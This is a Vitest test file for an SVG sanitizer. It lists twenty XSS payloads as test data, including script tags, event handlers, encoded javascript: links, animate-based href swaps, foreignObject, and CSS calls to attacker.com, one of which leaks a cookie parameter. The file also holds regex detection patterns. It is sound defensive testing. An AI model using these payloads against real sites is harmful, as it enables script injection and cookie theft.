import { describe, it, expect } from "vitest";
import { sanitizeSvg } from "../src/utils/sanitizeSvg.js";

describe("SVG Sanitizer Tests", () => {
  const xssPayloads = [
    { name: "Basic script tag", payload: '<svg><script>alert("XSS")</script></svg>' },
    { name: "Script with data URI", payload: '<svg><script href="data:text/javascript,alert(1)"></script></svg>' },
    { name: "SVG onload attribute", payload: '<svg onload="alert(1)"><circle r="10"/></svg>' },
    { name: "Circle onload attribute", payload: '<svg><circle cx="10" cy="10" r="5" onload="alert(1)"/></svg>' },
    { name: "Image onerror attribute", payload: '<svg><image href="invalid.jpg" onerror="alert(1)"/></svg>' },
    { name: "Anchor javascript: href", payload: '<svg><a href="javascript:alert(1)"><text>Click</text></a></svg>' },
    { name: "Mixed-case javascript: href", payload: '<svg><a href="jAvAsCrIpT:alert(1)"><text>Click</text></a></svg>' },
    { name: "Decimal entity-encoded href", payload: '<svg><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"><text>Click</text></a></svg>' },
    { name: "xlink:href with javascript:", payload: '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>' },
    { name: "Hex entity-encoded xlink:href", payload: '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"><text>Click</text></a></svg>' },
    { name: "SVG <set> modifying href", payload: '<svg><a href="#safe"><set attributeName="href" to="javascript:alert(1)"/><text>Click</text></a></svg>' },
    { name: "SVG <animate> modifying href", payload: '<svg><a href="#safe"><animate attributeName="href" values="javascript:alert(1)"/><text>Click</text></a></svg>' },
    { name: "foreignObject with iframe", payload: '<svg><foreignObject width="100" height="100"><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>' },
    { name: "foreignObject with HTML script", payload: '<svg><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>' },
    { name: "Direct <iframe> tag", payload: '<svg><iframe></iframe><rect width="10" height="10"/></svg>' },
    { name: "Direct <embed> tag", payload: '<svg><embed src="evil.swf"/><circle r="5"/></svg>' },
    { name: "Direct <object> tag", payload: '<svg><object data="evil.swf"></object></svg>' },
    { name: "Style with @import url()", payload: '<svg><defs><style>@import url("https://attacker.com/malicious.css"); .cls { fill: red; }</style></defs></svg>' },
    { name: "Style with external background url()", payload: '<svg><style>body { background: url("https://attacker.com/leak?cookie=1"); }</style></svg>' },
    { name: "use tag with external SVG URL", payload: '<svg><use href="https://attacker.com/evil.svg#exploit"/></svg>' },
  ];

  for (const { name, payload } of xssPayloads) {
    it(`loại bỏ payload XSS độc hại: ${name}`, () => {
      const sanitized = sanitizeSvg(payload);
      expect(sanitized).not.toMatch(/<script\b/i);
      expect(sanitized).not.toMatch(/\bon[a-z]+\s*=/i);
      expect(sanitized).not.toMatch(/href\s*=\s*["']?\s*javascript:/i);
      expect(sanitized).not.toMatch(/<iframe\b|<embed\b|<object\b|<foreignObject\b/i);
      expect(sanitized).not.toMatch(/@import\b/i);
      expect(sanitized).not.toMatch(/url\s*\(\s*["']?https?:\/\//i);
    });
  }

  it("giữ nguyên các phần tử SVG hợp lệ", () => {
    const validSvg = '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="red" /></svg>';
    const sanitized = sanitizeSvg(validSvg);
    expect(sanitized).toContain("<svg");
    expect(sanitized).toContain("<circle");
    expect(sanitized).toContain('fill="red"');
  });
});
